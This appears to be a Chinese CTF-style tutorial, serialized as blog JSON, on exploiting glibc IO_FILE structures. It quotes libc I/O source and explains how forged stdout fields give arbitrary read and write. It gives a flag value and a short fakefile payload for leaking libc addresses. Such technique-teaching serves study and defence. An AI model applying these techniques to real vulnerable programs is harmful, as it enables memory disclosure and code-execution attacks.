class=\"comment\">//全部复制到write_ptr</span></span><br><span class=\"line\">      \t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">//控制write_ptr实现任意写</span></span><br><span class=\"line\">      s += count;</span><br><span class=\"line\">      to_do -= count;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (to_do + must_flush &gt; <span class=\"number\">0</span>) <span class=\"comment\">//任意读的利用</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_size_t block_size, do_write;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class=\"comment\">//调用_IO_OVERFLOW</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> to_do == <span class=\"number\">0</span> ? EOF : n - to_do;</span><br><span class=\"line\">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class=\"line\">      do_write = to_do - (block_size &gt;= <span class=\"number\">128</span> ? to_do % block_size : <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (do_write)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          count = new_do_write (f, s, do_write);</span><br><span class=\"line\">          to_do -= count;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (count &lt; do_write)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (to_do)</span><br><span class=\"line\">        to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - to_do;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_2_1_stdout_</code>中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>为输出缓冲区起始位置（默认大小为<code>0x400</code>），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。<br>缓冲区建立函数<code>_IO_doallocbuf</code>会建立输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中，在建立了输出缓冲区后，会将基址赋值给<code>_IO_write_base</code>。</p>\n<p>若是设置的是<strong>全缓冲模式</strong><code>_IO_FULL_BUF</code>（一次接收所有输入），则会将结束地址给<code>_IO_write_end</code>，若是设置的是<strong>行缓冲模式</strong><code>_IO_LINE_BUF</code>（一次接收一行），则<code>_IO_write_end</code>中存的是<code>_IO_buf_base</code>。</p>\n<p>此外，<code>_IO_write_ptr</code>表示输出缓冲区中已经使用到的地址，<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。</p>\n<p>（1）任意写</p>\n<p>在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>。</p>\n<p>如果还有空间剩余，则会将要输出的<code>count</code>长度的数据复制到<code>_IO_write_ptr</code>，因此可通过这一点来实现任意地址写的功能。<br><strong>利用方式</strong>：只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。<br>这里需要注意的是，有宏定义<code>#define _IO_LINE_BUF 0x0200</code>，<code>flag &amp; _IO_LINE_BUF</code>为真，则表示<code>flag</code>中包含了<code>_IO_LINE_BUF</code>标识，即开启了行缓冲模式（可用<code>setvbuf(stdout,0,_IOLBF,1024)</code>开启），若要构造<code>flag</code>包含<code>_IO_LINE_BUF</code>标识，则<code>flag |= 0x200</code>即可。</p>\n<p>（2）任意读</p>\n<p>任意读利用了<code>if (to_do + must_flush &gt; 0)</code>成立分支的部分</p>\n<p><code>to_do</code>表明还有多少字节没有读入，因此一定是非负数。<code>must_flush</code>表明输出缓冲区是否需要刷新，当在行缓冲模式下检测到有换行符<code>\\n</code>的时候被赋值为1，因此当输出内容中有<code>\\n</code>且为<strong>行缓冲模式</strong>时就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。<br>若<code>to_do</code>大于<code>0</code>，也就是还有字符没有读入，也会执行该分支中的内容。因此，当 <strong>输出缓冲区未建立</strong> 或者 <strong>输出缓冲区没有剩余空间</strong> 或者 <strong>输出缓冲区剩余的空间不够一次性将目标地址中的数据完全复制过来</strong> 的时候，也会执行该<code>if</code>分支中的内容。<br><code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class=\"type\">int</span> ch)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位</span></span><br><span class=\"line\">  <span class=\"comment\">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class=\"number\">0</span> || f-&gt;_IO_write_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 调用_IO_do_write 输出 输出缓冲区</span></span><br><span class=\"line\">  <span class=\"comment\">// 从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ch == EOF)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class=\"line\">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) ch;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">static</span> _IO_size_t <span class=\"title function_\">new_do_write</span> <span class=\"params\">(_IO_FILE *fp, <span class=\"type\">const</span> <span class=\"type\">char</span> *data, _IO_size_t to_do)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  _IO_size_t count;</span><br><span class=\"line\">  <span class=\"comment\">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class=\"line\">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      _IO_off64_t new_pos</span><br><span class=\"line\">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_pos == _IO_pos_BAD)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      fp-&gt;_offset = new_pos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 调用函数输出输出缓冲区</span></span><br><span class=\"line\">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">return</span> count;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>综上，为了做到<strong>任意读</strong>，需要满足如下条件：<br>(1) 设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；<br>(2) 设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；<br>(3) 设置<code>_fileno</code>为<code>1</code>(stdout)；<br>(4) 设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；<br>(5) 设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。<br>此外，有一个<strong>大前提</strong>：需要调用<code>_IO_OVERFLOW()</code>才行，因此**需使得需要输出的内容中含有<code>\\n</code>换行符 或 设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>**（输出缓冲区无剩余空间）等。<br>一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。</p>\n<p>flag的构造如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_flags = <span class=\"number\">0xfbad0000</span> </span><br><span class=\"line\">_flags &amp; = ~_IO_NO_WRITES <span class=\"comment\">// _flags = 0xfbad0000</span></span><br><span class=\"line\">_flags | = _IO_CURRENTLY_PUTTING <span class=\"comment\">// _flags = 0xfbad0800</span></span><br><span class=\"line\">_flags | = _IO_IS_APPENDING <span class=\"comment\">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>\n\n<p>例如在<code>libc-2.27</code>下，构造<code>fakefile = p64(0xfbad1800) + p64(0)*3 + b&#39;\\x58&#39;</code>（<code>\\x58</code>覆盖<code>write_base</code>的低位），泄露出的第一个地址即为<code>_IO_file_jumps</code>的地址。</p>\n","site":{"data":{}},"excerpt":"<p>IO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。</p>","more":"<p>在linux中，一切都被当作文件处理，那自然就包括了IO，IO_FILE就是用来描述IO的文件结构体。所有的文件流文件都是_IO_FILE_plus的结构。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    _IO_FILE file; <span class=\"comment\">//完整的结构体内容</span></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span>* <span class=\"title\">vtable</span>;</span> <span class=\"comment\">//仅有一个指针</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中file是文件流，是linux中用于描述文件的结构，包含文件的关键数据，vtable则是一个<strong>虚表（虚拟函数表）</strong>，保存的是各种操作函数的指针，在对文件流进行操作时，实际是调用该虚表中的函数。</p>\n<p>为了管理所有的IO流，存在一个<strong>全局变量</strong>_IO_list_all的指针，这个指针指向<strong>IO_2_1_stderr</strong> 这个IO_FILE结构体，_IO_FILE结构体中会通过指针形成链表连接在一起。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span>* _<span class=\"title\">IO_list_all</span>;</span> </span><br></pre></td></tr></table></figure>\n\n<p>在使用fopen函数打开文件时，会创建一个对应该文件的_IO_FILE_plus结构体，并将其存放在<strong>堆</strong>中，其<strong>返回值就是其_IO_FILE结构file</strong>。</p>\n<p>除了_IO_2_1_stderr_（stderr）之外，程序原本还有输入输出流，因此堆中还有_IO_2_1_stdout_和_IO_2_1_stdin_。在链表中stderr-&gt;stdout-&gt;stdin。新加入的IO_FILE会从头（_IO_list_all）处链入链表，因此stdin实际上是链表的最后一个，所以他们的对应文件描述符0(stdin),1(stdout),2(stderr)也是有道理的。</p>\n<p>因为_IO_FILE存放在堆中（stderr、stdout、stdin除外，他们在libc中），因此许多对IO_FILE的利用都与堆相关。</p>\n<p>完整的<code>_IO_FILE_plus</code>结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_FILE_plus = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;amd64&#x27;</span>:&#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0x0</span>:<span class=\"string\">&#x27;_flags&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x8</span>:<span class=\"string\">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x10</span>:<span class=\"string\">&#x27;_IO_read_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x18</span>:<span class=\"string\">&#x27;_IO_read_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x20</span>:<span class=\"string\">&#x27;_IO_write_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x28</span>:<span class=\"string\">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x30</span>:<span class=\"string\">&#x27;_IO_write_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x38</span>:<span class=\"string\">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x40</span>:<span class=\"string\">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x48</span>:<span class=\"string\">&#x27;_IO_save_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x50</span>:<span class=\"string\">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x58</span>:<span class=\"string\">&#x27;_IO_save_end&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x60</span>:<span class=\"string\">&#x27;_markers&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x68</span>:<span class=\"string\">&#x27;_chain&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x70</span>:<span class=\"string\">&#x27;_fileno&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x74</span>:<span class=\"string\">&#x27;_flags2&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x78</span>:<span class=\"string\">&#x27;_old_offset&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x80</span>:<span class=\"string\">&#x27;_cur_column&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x82</span>:<span class=\"string\">&#x27;_vtable_offset&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x83</span>:<span class=\"string\">&#x27;_shortbuf&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x88</span>:<span class=\"string\">&#x27;_lock&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x90</span>:<span class=\"string\">&#x27;_offset&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x98</span>:<span class=\"string\">&#x27;_codecvt&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xa0</span>:<span class=\"string\">&#x27;_wide_data&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xa8</span>:<span class=\"string\">&#x27;_freeres_list&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xb0</span>:<span class=\"string\">&#x27;_freeres_buf&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xb8</span>:<span class=\"string\">&#x27;__pad5&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xc0</span>:<span class=\"string\">&#x27;_mode&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xc4</span>:<span class=\"string\">&#x27;_unused2&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xd8</span>:<span class=\"string\">&#x27;vtable&#x27;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"IO-FILE\"><a href=\"#IO-FILE\" class=\"headerlink\" title=\"_IO_FILE\"></a>_IO_FILE</h2><p>其中_IO_FILE的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags; <span class=\"comment\">/* low-order is flags.*/</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_file_flags _flags</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"type\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_base; </span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_backup_base; </span><br><span class=\"line\">  <span class=\"type\">char</span> *_IO_save_end; </span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span><span class=\"comment\">/*指向下一个file结构*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> _fileno;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> _blksize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"type\">int</span> _flags2;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  _IO_off_t _old_offset; </span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">  _IO_lock_t *_lock;</span><br><span class=\"line\">  <span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_USE_OLD_IO_FILE <span class=\"comment\">//开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）</span></span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_complete</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> _<span class=\"title\">file</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">//结束宏判断</span></span></span><br><span class=\"line\">[...] </span><br><span class=\"line\"><span class=\"type\">int</span> _mode;</span><br><span class=\"line\">  <span class=\"comment\">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class=\"line\">  <span class=\"type\">char</span> _unused2[<span class=\"number\">15</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">int</span>) - <span class=\"number\">4</span> * <span class=\"keyword\">sizeof</span> (<span class=\"type\">void</span> *) - <span class=\"keyword\">sizeof</span> (<span class=\"type\">size_t</span>)];</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到_IO_FILE结构中存放着文件的基本信息，比如说：读/写的起始和结束位置，当前读/写位置，缓冲区的起始和结束位置，保存位置等。</p>\n<p>比较关键的还有一个_chain，它指向下一个_IO_FILE结构，通过该指针将所有_IO_FILE连成一个链表。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span><span class=\"comment\">/*指向下一个file结构*/</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"IO-JUMP-t虚表\"><a href=\"#IO-JUMP-t虚表\" class=\"headerlink\" title=\"_IO_JUMP_t虚表\"></a>_IO_JUMP_t虚表</h2><h3 id=\"虚表和虚函数\"><a href=\"#虚表和虚函数\" class=\"headerlink\" title=\"虚表和虚函数\"></a>虚表和虚函数</h3><p>虚表和虚函数在C语言中不常见，甚至不像C++那样有virtual关键字实现虚函数。实际上虚表和虚函数是用于实现<strong>多态</strong>这种特性的，而C语言本身是面向过程的，因此没有virtual也在情理之中。</p>\n<p>但实际上，C语言是可以做到面向对象的，通过struct结构体可以实现类似类的结构，<strong>结构体中的数据就相当于是类中的成员变量，结构体中的函数指针就相当于是类中的成员函数</strong>。</p>\n<p>但是这种方法本身也有些弊端，每个结构体实例都会包含所有的函数指针，而每个函数指针都要占据空间（即使其没有被使用）。因此在C语言编程中很少会有将函数指针写在结构体内的，而是在结构体外写一个函数，通过参数传入结构体的实例来对结构体进行操作。实际上在C++中，如果没有virtual关键字的话，编译器也会采取类似的方法对成员函数进行处理。</p>\n<p>但如果要实现<strong>多态</strong>的话，就不能用这种节省内存的方法了。对于C语言而言，就是将函数指针放在结构体中，每一个结构体实例通过该函数指针指向自己定义的函数，并且通过该函数指针调用它，这样的函数就可以说是虚函数。</p>\n<p>那虚表是什么呢？毕竟虚函数的数量可能不止一个，并且和一般的函数有些不一样（存在其他同名函数），为了方便对每个实例的虚函数进行管理，就有了虚表这种结构。<strong>虚表实际上就是虚函数的表，用来管理虚函数</strong>，虚表是从属于该类的，会通过一个指针指向该虚表。</p>\n<h3 id=\"IO-JUMP-T结构\"><a href=\"#IO-JUMP-T结构\" class=\"headerlink\" title=\"_IO_JUMP_T结构\"></a>_IO_JUMP_T结构</h3><p>_IO_jump_t结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy);<span class=\"comment\">//0</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy2);<span class=\"comment\">//1 DUMMY</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish);<span class=\"comment\">//2 finish</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_overflow_t, __overflow);<span class=\"comment\">//3 overflow</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __underflow);<span class=\"comment\">//4 underflow</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_underflow_t, __uflow);<span class=\"comment\">//5 uflow</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<span class=\"comment\">//6 pbackfail </span></span><br><span class=\"line\">    <span class=\"comment\">/* showmany */</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsputn_t, __xsputn);<span class=\"comment\">//7 xsputn</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<span class=\"comment\">//8 xsgetn</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_seekoff_t, __seekoff);<span 